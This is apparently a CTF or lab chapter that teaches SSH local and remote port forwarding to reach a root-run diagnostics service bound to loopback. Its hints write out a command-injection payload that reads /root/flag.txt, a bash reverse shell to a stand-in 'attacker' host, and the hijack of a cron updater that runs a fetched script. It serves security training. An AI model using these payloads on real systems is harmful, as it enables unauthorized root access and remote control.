# Chapter 07 — "Local Service + Port Forwarding"  ·  Pivoting to a loopback service

> **Host:** `hollow-relay-01` (compose service `target-pivot`)
> **Foothold:** `labuser1 : password123`
> **Objective:** become **root** and read `/root/flag.txt`
> **Difficulty:** ★★★☆ (the win isn't on your shell — you have to reach for it)

---

## Mission brief

`sudo -l` is empty. No odd SUID, no capabilities. Enumeration of the *host* is
a dead end — because the vulnerable thing isn't a file, it's a **service**. This
box runs an internal "diagnostics" web app bound to `127.0.0.1:8080`, **as
root**, and its `/ping` endpoint shells out with unsanitised input. The admins
figured loopback-only meant unreachable.

It isn't. Loopback-only stops a *remote* client. It does nothing against someone
who already has a shell and can **forward a port** to it. Tunnel from your
attacker box straight to the target's `127.0.0.1:8080`, hit `/ping?host=`, and a
`;` in the parameter is command execution as root.

> **The whole idea in one line:** a service on `127.0.0.1` is not safe from
> someone with a shell — `ssh -L` turns the target's loopback into *your*
> loopback.

---

## Objective and rules

- **Win condition:** read `/root/flag.txt`. Flag format: `R2R{...}`.
- **In scope:** this container only.
- **Connect:** from the attacker box, `ssh labuser1@target-pivot` (password `password123`).
  Or `docker exec -it -u labuser1 target-pivot bash`.
- Two write primitives, one tunnel. Either wins.

---

## Recon starter

```bash
# on the target, as labuser1:
ss -tlnp            # what's listening, and on which interface?
# 127.0.0.1:8080 -> an internal web service, loopback only
```

A service bound to `127.0.0.1` that you can't reach from outside is exactly the
thing port forwarding is for.

---

## Two services, two forwarding directions

From the **attacker** box (not the target):

```bash
# -L  LOCAL forward: pull the TARGET's loopback service to YOU
ssh -L 8080:127.0.0.1:8080 labuser1@target-pivot
curl http://127.0.0.1:8080/                 # the internal diagnostics app

# -R  REMOTE forward: push one of YOUR services onto the TARGET's loopback
python3 -m http.server 8000                 # your payload server
ssh -R 9000:127.0.0.1:8000 labuser1@target-pivot
```

`-L <lport>:<host>:<port>` makes your SSH client listen on `<lport>` and forward
through the session to `<host>:<port>` **as seen from the target**. `-R` is the
mirror: the *target* listens on a port and forwards back to a service on **your**
side.

---

## Stations

| Station | Forward | The service | Win |
|---|---|---|---|
| A | `-L` local | a root web app on `127.0.0.1:8080` with command injection | inject in `/ping?host=` → **RCE as root** |
| B | `-R` remote | a root updater that fetches `http://127.0.0.1:9000/` | publish your script there → root runs it |

Both end in code execution **as root** — the chapter is about *reaching* the
service, then exploiting it.

---

## Hints

<details><summary>Station A — local forward → web RCE</summary>

Open the `-L` forward, then look at the app: `curl http://127.0.0.1:8080/` shows
a `/ping?host=` diagnostics endpoint. It runs `ping -c1 <host>` through a shell,
so a `;` in `host` starts a second command — and the app runs as root:

```bash
curl -G 'http://127.0.0.1:8080/ping' \
  --data-urlencode 'host=127.0.0.1; id; cat /root/flag.txt'
```

For an interactive shell, inject a reverse shell back to a listener on your box
(`bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'`). See [[Reverse-Shell-Reference]].

</details>

<details><summary>Station B — remote forward → the updater runs your script</summary>

`cat /etc/cron.d/rtr-updater`: root fetches `http://127.0.0.1:9000/payload.sh`
every minute and pipes it to bash. Nothing listens on `:9000` — so put something
there. Serve a `payload.sh` on your attacker box (`python3 -m http.server
8000`), then `ssh -R 9000:127.0.0.1:8000 labuser1@target-pivot`. Now the
target's `127.0.0.1:9000` is *your* server; root downloads and runs your script.

</details>

<details><summary>Dynamic forwarding and no-SSH options</summary>

`-D <port>` makes a SOCKS proxy for reaching a whole subnet behind the target
(`proxychains`, `curl --socks5`). No SSH on the box? **chisel** and **socat** do
the same `-L`/`-R` forwards. The debrief has all of it.

</details>

---

## Capture

```bash
# Station A (command injection runs as root, over the -L tunnel):
curl -G 'http://127.0.0.1:8080/ping' --data-urlencode 'host=127.0.0.1; cat /root/flag.txt'
# Station B (your payload copied it out):
ssh labuser1@target-pivot cat /tmp/flag
```

The debrief — the loopback-RCE mechanic, `-L` / `-R` / `-D` forwarding, chisel
for when you have no SSH, detection, and the fix — is in [WRITEUP.md](WRITEUP.md).
Try the box before you open it.
